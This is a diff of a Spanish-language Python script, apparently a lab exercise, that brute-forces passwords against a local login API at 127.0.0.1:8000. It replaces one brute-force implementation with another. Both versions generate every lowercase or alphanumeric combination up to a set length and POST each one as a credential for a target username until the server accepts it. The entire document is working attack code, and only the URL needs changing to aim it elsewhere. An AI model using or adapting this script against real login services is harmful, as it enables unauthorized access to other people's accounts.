@@ -1,87 +1,69 @@
 import requests
-import json
 import itertools
+import string
 import time
 import sys
-from requests.exceptions import ConnectionError, Timeout
 
+URL_API = "http://127.0.0.1:8000/login"
 
-URL = "http://127.0.0.1:8000/login"
-USERNAME = "admin" 
-ALPHABET = "abcdefghijklmnopqrstuvwxyz" 
-MAX_LENGTH = 11 
-SLEEP_TIME = 0.001 
-print(f"--- Iniciando Ataque de FUERZA BRUTA OPTIMIZADO contra {URL} ---")
-print(f"Usuario objetivo: {USERNAME}")
-print(f"Contraseña a buscar: 'abc' (Longitud {MAX_LENGTH})")
-print(f"Intentos por segundo (estimado): ~{1 / SLEEP_TIME}")
-print("-" * 50)
+CARACTERES = string.ascii_lowercase + string.digits
+LONGITUD_MAXIMA_CONTRASENA = 5 
 
-def run_optimized_brute_force_attack():
-    session = requests.Session() 
+def generar_contrasenas():
+    lista_contrasenas = []
+    for longitud in range(1, LONGITUD_MAXIMA_CONTRASENA + 1):
+        for combinacion in itertools.product(CARACTERES, repeat=longitud):
+            lista_contrasenas.append("".join(combinacion))
+    return lista_contrasenas
+
+def ejecutar_ataque(nombre_usuario: str):
+    print(f"[*] Iniciando ataque de fuerza bruta contra el usuario: '{nombre_usuario}'")
+    tiempo_inicio = time.time()
     
-    start_time = time.time()
-    intentos = 0
-    encontrado = False
-
-    for length in range(1, MAX_LENGTH + 1):
-        print(f"\n--- Probando contraseñas de longitud {length} ---")
-        
-        to_attempt = itertools.product(ALPHABET, repeat=length)
-        
-        for attempt_tuple in to_attempt:
-            password = "".join(attempt_tuple)
-            intentos += 1
-            
-            if intentos % 100 == 0 or intentos <= 10:
-                 print(f"Intento {intentos:,}: {password}")
-
-            
-            payload = {
-                "nombre_usuario": USERNAME,
-                "contrasena": password
-            }
-            headers = {
-                "Content-Type": "application/json"
-            }
-            
-            try:
-        
-                time.sleep(SLEEP_TIME) 
-                
-                response = session.post(URL, headers=headers, data=json.dumps(payload), timeout=5)
-
-            
-                if response.status_code == 200:
-                    encontrado = True
-                    break 
-                
-                
-                elif response.status_code != 401 and response.status_code != 422:
-                    print(f" Error inesperado del servidor ({response.status_code}) para la contraseña: {password}.")
-
-            except ConnectionError:
-                print("\n ERROR DE CONEXIÓN: Asegúrate de que tu servidor Uvicorn esté corriendo.")
-                sys.exit(1)
-                
-            except Timeout:
-                print(f" TIEMPO DE ESPERA AGOTADO. El servidor no responde a tiempo. Saltando intento...")
-                time.sleep(1) 
-                
-        if encontrado:
-            break # Éxito
-
-    tiempo_total = time.time() - start_time
-    print("-" * 50)
+    contrasenas_a_probar = generar_contrasenas()
     
-    if encontrado:
-        print(f" ÉXITO! Contraseña encontrada: {password}")
-    else:
-        print(" FALLO! La contraseña no se encontró dentro del límite establecido.")
+    contador_intentos = 0
+    
+    for contrasena_supuesta in contrasenas_a_probar:
+        contador_intentos += 1
         
-    print(f"Intentos totales: {intentos:,}")
-    print(f"Tiempo total: {tiempo_total:.4f} segundos")
-    return 0
+        if contador_intentos % 1000 == 0:
+            print(f"[+] Probando... (Intento #{contador_intentos}, Contraseña actual: '{contrasena_supuesta}')")
+        
+        cuerpo = {
+            "usuario": nombre_usuario,
+            "contrasena": contrasena_supuesta
+        }
+        
+        # Esta línea fallará (sin manejo de error) si el servidor no está corriendo
+        respuesta = requests.post(URL_API, json=cuerpo)
+        
+        if respuesta.status_code == 200:
+            respuesta_json = respuesta.json()
+            if respuesta_json.get("message") == "login successful":
+                tiempo_fin = time.time()
+                print("Contraseña encontrada.")
+                print(f"Usuario: {nombre_usuario}")
+                print(f"Contraseña: {contrasena_supuesta}")
+                print(f"Total de intentos: {contador_intentos}")
+                print(f"Tiempo total: {tiempo_fin - tiempo_inicio:.2f} segundos.")
+                return True 
+
+    print("\nFallo: No se pudo encontrar la contraseña dentro de la longitud máxima establecida.")
+    return False
 
 if __name__ == "__main__":
-    run_optimized_brute_force_attack()
+    nombre_usuario_objetivo = ""
+    
+    if len(sys.argv) < 2:
+        entrada_usuario = input("Por favor, introduce el nombre de usuario a atacar (ej. admin): ")
+        if entrada_usuario:
+            nombre_usuario_objetivo = entrada_usuario
+    else:
+        nombre_usuario_objetivo = sys.argv[1]
+        
+    if not nombre_usuario_objetivo:
+        print("Uso: python attack.py <nombre_de_usuario> o proporciona el usuario al ser solicitado.")
+        sys.exit(1)
+        
+    ejecutar_ataque(nombre_usuario_objetivo)
